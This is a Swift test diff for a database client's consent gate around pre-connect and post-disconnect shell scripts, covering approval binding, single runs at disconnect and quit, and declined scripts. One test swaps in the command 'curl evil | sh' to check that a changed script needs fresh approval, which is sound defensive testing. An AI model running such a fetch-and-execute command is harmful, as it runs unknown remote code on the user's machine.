@@ -12,13 +12,15 @@ import Testing
 private final class ScriptQuestionSpy: PreConnectScriptAsking {
     var answer: ConsentAnswer
     private(set) var askedScripts: [String] = []
+    private(set) var askedPostDisconnectScripts: [String?] = []
 
     init(answer: ConsentAnswer) {
         self.answer = answer
     }
 
-    func ask(connectionName: String, script: String) async -> ConsentAnswer {
+    func ask(connectionName: String, script: String, postDisconnectScript: String?) async -> ConsentAnswer {
         askedScripts.append(script)
+        askedPostDisconnectScripts.append(postDisconnectScript)
         return answer
     }
 }
@@ -105,6 +107,30 @@ struct PreConnectScriptConsentTests {
         }
     }
 
+    @Test("The prompt shows the post-disconnect script, and the approval covers it too")
+    func approvalIsBoundToThePostDisconnectScript() async {
+        let spy = ScriptQuestionSpy(answer: .approved)
+        let consent = PreConnectScriptConsent(asker: spy)
+        var scripted = connection(script: "vpn up")
+        scripted.postDisconnectScript = "vpn down"
+
+        #expect(await consent.confirm(scripted))
+        #expect(spy.askedPostDisconnectScripts == ["vpn down"])
+
+        scripted.postDisconnectScript = "curl evil | sh"
+        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
+            try await consent.authorize(scripted, trigger: .background)
+        }
+    }
+
+    @Test("A post-disconnect script without a pre-connect script is never offered")
+    func postDisconnectAloneIsIgnored() {
+        var connection = connection(script: nil)
+        connection.postDisconnectScript = "vpn down"
+        #expect(connection.trimmedPostDisconnectScript == nil)
+        #expect(!connection.hasPreConnectScript)
+    }
+
     @Test("An approval expires, and a withdrawn one is gone")
     func approvalExpiresAndWithdraws() async {
         let spy = ScriptQuestionSpy(answer: .approved)
@@ -159,7 +185,12 @@ struct PreConnectScriptEntryPointTests {
         var scriptRan: Bool { FileManager.default.fileExists(atPath: marker.path) }
     }
 
-    private func makeFixture(answer: ConsentAnswer) throws -> Fixture {
+    private func makeFixture(
+        answer: ConsentAnswer,
+        script: ((URL) -> String)? = nil,
+        postDisconnectScript: String? = nil,
+        ranPostDisconnect: RanPostDisconnectScripts = RanPostDisconnectScripts()
+    ) throws -> Fixture {
         FakeMSSQLPluginRegistration.registerIfNeeded()
         let unique = UUID().uuidString
         let fileURL = FileManager.default.temporaryDirectory
@@ -171,11 +202,14 @@ struct PreConnectScriptEntryPointTests {
         let spy = ScriptQuestionSpy(answer: answer)
         let manager = DatabaseManager(
             connectionStorage: storage,
-            preConnectScriptConsent: PreConnectScriptConsent(asker: spy)
+            preConnectScriptConsent: PreConnectScriptConsent(asker: spy),
+            postDisconnectScripts: PostDisconnectScripts(run: { ranPostDisconnect.record($0) })
         )
 
         var connection = TestFixtures.makeConnection(name: "Scripted", type: .mssql)
-        connection.preConnectScript = "touch '\(marker.path)'"
+        connection.username = "reporting"
+        connection.preConnectScript = script?(marker) ?? "touch '\(marker.path)'"
+        connection.postDisconnectScript = postDisconnectScript
         storage.addConnection(connection)
         FakeMSSQLPlugin.recordConfigurations(for: connection.id)
 
@@ -225,6 +259,73 @@ struct PreConnectScriptEntryPointTests {
         #expect(fixture.spy.askedScripts.count == 1)
         #expect(fixture.scriptRan)
         #expect(fixture.manager.driver(for: fixture.connection.id) != nil)
+    }
+
+    @Test("The pre-connect script sees the connection it opens")
+    func scriptSeesTheConnection() async throws {
+        let fixture = try makeFixture(answer: .approved) { marker in
+            """
+            printf '%s|%s|%s|%s|%s' "$TABLEPRO_CONNECTION_NAME" "$TABLEPRO_HOST" "$TABLEPRO_PORT" \
+              "$TABLEPRO_USER" "$TABLEPRO_DATABASE" > '\(marker.path)'
+            """
+        }
+        defer { fixture.cleanUp() }
+
+        try await fixture.manager.ensureConnected(fixture.connection)
+        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)
+
+        let seen = try String(contentsOf: fixture.marker, encoding: .utf8)
+        let connection = fixture.connection
+        #expect(seen == "Scripted|\(connection.host)|\(connection.port)|reporting|testdb")
+    }
+
+    @Test("A post-disconnect script runs once, after the session it was approved with ends")
+    func postDisconnectRunsOnce() async throws {
+        let ran = RanPostDisconnectScripts()
+        let fixture = try makeFixture(answer: .approved, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
+        defer { fixture.cleanUp() }
+
+        try await fixture.manager.ensureConnected(fixture.connection)
+        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)
+        #expect(fixture.spy.askedPostDisconnectScripts == ["vpn down"])
+        #expect(ran.scripts.isEmpty)
+
+        await fixture.manager.disconnectSession(fixture.connection.id, origin: .userRequested)
+        await fixture.manager.disconnectSession(fixture.connection.id, origin: .userRequested)
+        try await waitUntil { ran.scripts.count == 1 }
+
+        let pending = try #require(ran.scripts.first)
+        #expect(pending.script == "vpn down")
+        #expect(pending.context.connectionName == "Scripted")
+        #expect(pending.timeoutSeconds == ConnectionScriptRunner.defaultTimeoutSeconds)
+        #expect(!fixture.manager.postDisconnectScripts.isArmed(for: fixture.connection.id))
+    }
+
+    @Test("Quitting runs the post-disconnect script of every session still open")
+    func quitRunsArmedScripts() async throws {
+        let ran = RanPostDisconnectScripts()
+        let fixture = try makeFixture(answer: .approved, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
+        defer { fixture.cleanUp() }
+
+        try await fixture.manager.ensureConnected(fixture.connection)
+        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)
+        await fixture.manager.runPostDisconnectScriptsBeforeQuit()
+
+        #expect(ran.scripts.map(\.script) == ["vpn down"])
+        #expect(fixture.manager.session(for: fixture.connection.id) != nil)
+    }
+
+    @Test("A declined pre-connect script arms no post-disconnect script")
+    func declinedArmsNothing() async throws {
+        let ran = RanPostDisconnectScripts()
+        let fixture = try makeFixture(answer: .declined, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
+        defer { fixture.cleanUp() }
+
+        await #expect(throws: PreConnectScriptConsentError.declined) {
+            try await fixture.manager.ensureConnected(fixture.connection)
+        }
+        await fixture.manager.postDisconnectScripts.fireAllAndWait()
+        #expect(ran.scripts.isEmpty)
     }
 
     @Test("A gesture that asked first is not asked again at the connect")
@@ -400,5 +501,18 @@ struct PreConnectScriptEntryPointTests {
             syncTracker: live.syncTracker,
             welcomeRouter: live.welcomeRouter
         )
+    }
+}
+
+private final class RanPostDisconnectScripts: @unchecked Sendable {
+    private let lock = NSLock()
+    private var recorded: [PendingPostDisconnectScript] = []
+
+    var scripts: [PendingPostDisconnectScript] {
+        lock.withLock { recorded }
+    }
+
+    func record(_ script: PendingPostDisconnectScript) {
+        lock.withLock { recorded.append(script) }
     }
 }
